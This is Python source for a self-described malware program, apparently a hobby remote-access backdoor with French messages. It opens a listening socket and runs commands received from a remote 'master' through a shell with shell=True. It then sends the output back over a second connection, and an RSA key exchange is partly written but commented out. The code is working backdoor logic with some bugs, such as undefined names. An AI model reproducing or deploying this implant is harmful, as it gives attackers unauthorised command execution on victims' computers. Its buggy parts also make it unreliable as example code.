import threading
import time
import socket
import sys
import os
import subprocess

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

remote_public_key = None
public_key_pem = None
private_key = None

IN_PORT = 44455
OUT_PORT = 44444


class InThread(threading.Thread):
    global OUT_PORT
    global IN_PORT

    def __init__(self, in_port=IN_PORT):
        super().__init__()
        self.in_port = in_port
        self.socket = socket.socket()
        self.listen()

    def listen(self):
        try:
            self.socket.bind(('', self.in_port))
            self.socket.listen(5)
            print('listening for incoming traffic')
            self.start()
        except socket.timeout:
            self.listen()

    def run(self):
        conn, in_ip = self.socket.accept()
        print('connection received')
        #self.init_public_key()
        malw.start_out_thread(in_ip)
        again = True
        while again:
            msg = conn.recv(1024).decode('UTF-8')
            print(msg)
            if msg == 'exit':
                again = False
            elif msg == 'shell':
                comm_again = True
                while comm_again:
                    command = conn.recv(1024).decode('UTF-8')
                    print(command)
                    if command == '':
                        pass
                    elif command == 'exit':
                        comm_again = False
                    else:
                        try:
                            resp = subprocess.check_output(command.split(), shell=True)
                            print(command)
                            print(resp)
                            malw.send(resp.decode('cp850'))
                        except subprocess.CalledProcessError:
                            malw.send("Impossible d'exécuter cette commande")
            else:
                pass

        self.socket.close()
        print('Closed socket coming from {}'.format(in_ip))

    def init_public_key(self):
        try:
            remote_public_key_pem = connection.recv(InThread.BUFFER_SIZE)
            global remote_public_key
            remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
            print("Remote public key successfully loaded")
        except timeout:
            self.init_public_key()
        except ValueError:
            print("Invalid Public Key received")

    # Used to be called decrypt
    def rsa_decrypt(self,ciphertext):
        global private_key
        return private_key.decrypt(ciphertext,
                                padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None))


class OutThread(threading.Thread):
    def __init__(self, ip, out_port: int = OUT_PORT):
        super().__init__()
        self.ip = ip
        self.out_port = out_port

        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip[0], self.out_port))
            print('trying to connect to master')
        except ConnectionError:
            print('Unable to connect to {}'.format(self.ip))

        #self.send_public_keys()

    def run(self):
        again = True
        while again:
            msg = input('{} > '.format(self.ip))
            if msg == '':
                pass
            elif msg == 'exit':
                again = False
                self.send(msg)
            elif msg == 'shell':
                keepalive = True
                while keepalive:
                    shell = input('{} > shell > '.format(self.ip))
                    if shell == '':
                        pass
                    elif shell == 'exit':
                        keepalive = False
                    else:
                        self.send(shell)
            elif msg == 'info':
                send(msg)
        s.close()
        print('Terminated connection to {}'.format(self.ip))

    def send(self, message):
        try:
            #print('sending', message)
            self.sock.sendall(message)
        except ConnectionError:
            print('Unable to send <<{}>> to {}'.format(message, self.ip))

    def send_public_keys(self):
        try:
            global public_key_pem
            self.sock.sendall(public_key_pem)
        except ConnectionError:
            print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
            self.send_public_keys()

    # Method used to be called encrypt
    def rsa_encrypt(self, message):
        global remote_public_key
        return remote_public_key.encrypt(message,
                                         padding.OAEP(
                                             mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                             algorithm=hashes.SHA256(),
                                             label=None))


class Malware(threading.Thread):
    global OUT_PORT
    global IN_PORT

    def __init__(self, out_port=OUT_PORT, in_port=IN_PORT):
        super().__init__()
        self.ip = None
        self.out_port = out_port
        self.in_port = in_port

        self.prod = InThread(self.in_port)
        self.cons = None

        global private_key
        global public_key_pem
        #private_key = self.generate_rsa_keys()
        #public_key_pem = self.serialize_public_key(private_key.public_key())
        self.start()

    def start_out_thread(self, out_ip):
        self.ip = out_ip
        self.cons = OutThread(self.ip)

    def run(self):
        #if self.cons.is_alive():
        #    self.cons.join()
        if self.prod.is_alive():
            self.prod.join()

        self.stop()

    def send(self, message):
        self.cons.send(message.encode('UTF-8'))

    def stop(self):
        self.prod.stop()
        self.cons.stop()

    def generate_rsa_keys(self):
        return rsa.generate_private_key(backend=default_backend(),
                                               public_exponent=65537,
                                               key_size=2048)

    def serialize_public_key(self,public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)


while True:
    malw = Malware()
    while malw.is_alive():
        time.sleep(10)

